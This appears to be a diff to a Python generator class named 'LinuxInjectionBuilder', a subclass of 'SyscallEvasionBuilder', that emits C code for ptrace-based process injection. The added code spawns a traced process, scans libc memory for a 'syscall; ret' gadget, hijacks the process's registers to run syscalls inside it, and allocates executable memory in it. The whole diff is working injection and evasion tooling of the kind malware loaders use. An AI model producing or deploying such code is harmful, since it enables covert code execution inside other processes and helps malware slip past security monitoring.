@@ -75,3 +75,167 @@ class LinuxInjectionBuilder(SyscallEvasionBuilder):
     munmap({var}, (size_t){size_var});
     free(decoded);
 """
+
+    def ptrace_remote_syscall_helpers(self) -> str:
+        """Shared ptrace helpers: TRACEME spawn, libc syscall gadget, remote mmap."""
+        return r"""
+#ifndef PTRACE_SYSCALL
+#define PTRACE_SYSCALL 24
+#endif
+
+static int wait_stop(pid_t pid, int *status)
+{
+    if (waitpid(pid, status, 0) < 0)
+        return -1;
+    return WIFSTOPPED(*status) ? 0 : -1;
+}
+
+static unsigned long find_syscall_gadget(pid_t pid)
+{
+    char path[256];
+    char line[512];
+    unsigned long start = 0, end = 0;
+    FILE *maps;
+    int fd;
+    unsigned char buf[4096];
+    ssize_t n;
+    size_t off;
+
+    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
+    maps = fopen(path, "r");
+    if (!maps) return 0;
+    while (fgets(line, sizeof(line), maps)) {
+        if (strstr(line, "libc") && strstr(line, "r-xp")) {
+            if (sscanf(line, "%lx-%lx", &start, &end) == 2)
+                break;
+        }
+    }
+    fclose(maps);
+    if (!start || end <= start) return 0;
+
+    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
+    fd = open(path, O_RDONLY);
+    if (fd < 0) return 0;
+    for (off = 0; start + off + 2 < end; ) {
+        size_t chunk = sizeof(buf);
+        if (start + off + chunk > end)
+            chunk = (size_t)(end - (start + off));
+        if (chunk < 3) break;
+        if (lseek(fd, (off_t)(start + off), SEEK_SET) < 0)
+            break;
+        n = read(fd, buf, chunk);
+        if (n < 3) break;
+        for (ssize_t i = 0; i + 2 < n; i++) {
+            if (buf[i] == 0x0f && buf[i + 1] == 0x05 && buf[i + 2] == 0xc3) {
+                close(fd);
+                return start + off + (unsigned long)i;
+            }
+        }
+        off += (size_t)(n >= 2 ? n - 2 : n);
+    }
+    close(fd);
+    return 0;
+}
+
+static long remote_syscall6_attached(pid_t pid, struct user_regs_struct *saved,
+    long nr, unsigned long a0, unsigned long a1, unsigned long a2,
+    unsigned long a3, unsigned long a4, unsigned long a5)
+{
+    struct user_regs_struct regs;
+    unsigned long gadget;
+    int status;
+
+    gadget = find_syscall_gadget(pid);
+    if (!gadget) return -1;
+
+    regs = *saved;
+    regs.rax = (unsigned long)nr;
+    regs.orig_rax = (unsigned long)nr;
+    regs.rdi = a0;
+    regs.rsi = a1;
+    regs.rdx = a2;
+    regs.r10 = a3;
+    regs.r8 = a4;
+    regs.r9 = a5;
+    regs.rip = gadget;
+
+    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
+        return -1;
+    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) < 0)
+        return -1;
+    if (wait_stop(pid, &status) < 0)
+        return -1;
+    if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) < 0)
+        return -1;
+    if (wait_stop(pid, &status) < 0)
+        return -1;
+    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
+        return -1;
+    return (long)regs.rax;
+}
+
+static unsigned long remote_mmap_attached(pid_t pid, struct user_regs_struct *saved, size_t len)
+{
+    size_t map_len = (len + 0xfffUL) & ~0xfffUL;
+    if (map_len == 0) map_len = 0x1000;
+    return (unsigned long)remote_syscall6_attached(
+        pid, saved, 9, 0, map_len,
+        PROT_READ | PROT_WRITE | PROT_EXEC,
+        MAP_PRIVATE | MAP_ANONYMOUS, (unsigned long)-1, 0);
+}
+
+static int libc_is_mapped(pid_t pid)
+{
+    char path[256];
+    char line[512];
+    FILE *maps;
+    int found = 0;
+
+    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
+    maps = fopen(path, "r");
+    if (!maps) return 0;
+    while (fgets(line, sizeof(line), maps)) {
+        if (strstr(line, "libc") && strstr(line, "r-xp")) {
+            found = 1;
+            break;
+        }
+    }
+    fclose(maps);
+    return found;
+}
+
+static pid_t spawn_traceable_target(const char *cmd)
+{
+    pid_t pid = fork();
+    if (pid == 0) {
+        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0)
+            _exit(127);
+        raise(SIGSTOP);
+        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
+        _exit(127);
+    }
+    return pid;
+}
+
+static int wait_until_execed(pid_t pid)
+{
+    int status;
+    int i;
+
+    if (wait_stop(pid, &status) < 0)
+        return -1;
+    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0)
+        return -1;
+    if (wait_stop(pid, &status) < 0)
+        return -1;
+
+    /* Dynamic linker stop: step syscalls until libc RX is mapped. */
+    for (i = 0; i < 2000 && !libc_is_mapped(pid); i++) {
+        if (ptrace(PTRACE_SYSCALL, pid, NULL, NULL) < 0)
+            return -1;
+        if (wait_stop(pid, &status) < 0)
+            return -1;
+    }
+    return libc_is_mapped(pid) ? 0 : -1;
+}
+"""
